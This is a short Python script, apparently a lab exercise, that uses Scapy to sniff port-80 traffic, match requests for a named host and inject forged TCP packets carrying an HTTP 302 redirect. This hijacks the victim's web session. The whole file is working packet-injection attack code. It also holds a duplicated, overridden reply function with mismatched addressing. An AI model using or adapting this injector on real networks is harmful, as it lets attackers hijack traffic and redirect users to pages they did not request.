from scapy.all import *



class TCP_HTTP_inject(AnsweringMachine):#make function
    function_name="TCP_HTTP_spoof"#call function set
    filter = "tcp port 80"#filter set

#redir site warring.or.kr
    def parse_options(self, target_host="gilgil.net", redirect_url='http://en.wikipedia.org/wiki/HTTp_302'):
        self.target_host = target_host
        self.redirect_url = redirect_url

#site "all-free-download.com" is test tcp in flags value "PR" : push, RST
#    def parse_options(self, target_host="all-free-download.com", redirect_url='test'):
#        self.target_host = target_host
#        self.redirect_url = redirect_url

    def is_request(self, req):#read packet and find target_host
        return req.haslayer(Raw) and ("%s" % self.target_host in req.getlayer(Raw).load)

    def make_reply(self, req): #send packet     
        ip = req.getlayer(IP)      
        tcp = req.getlayer(TCP)
        data = "HTTP/1.1 302 Found\r\nBlocked\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
        resp = IP(dst=ip.dst, src=ip.src) / TCP(dport=ip.dport,sport=ip.sport, flags="PR", seq=tcp.seq+len(tcp.payload), ack=tcp.ack )/ Raw(load=data)   
        return resp

    def make_reply(self, req): #send packet      
        ip = req.getlayer(IP)      
        tcp = req.getlayer(TCP)
        http_payload = "HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % self.redirect_url
        resp = IP(dst=ip.src, src=ip.dst) / TCP(dport=ip.sport,sport=ip.dport, flags="PA", seq=tcp.ack, ack=tcp.seq+len(tcp.payload)) / Raw(load=http_payload)   
        return resp

def print_ex():
	print "this tool is redir to wiki 302 page when connection gilgil.net"
	print "made by Fhwang"
	print "redir URL : http://en.wikipedia.org/wiki/HTTp_302"

if __name__ == '__main__':
    conf.L3socket = L3RawSocket
print_ex()
TCP_HTTP_inject()()
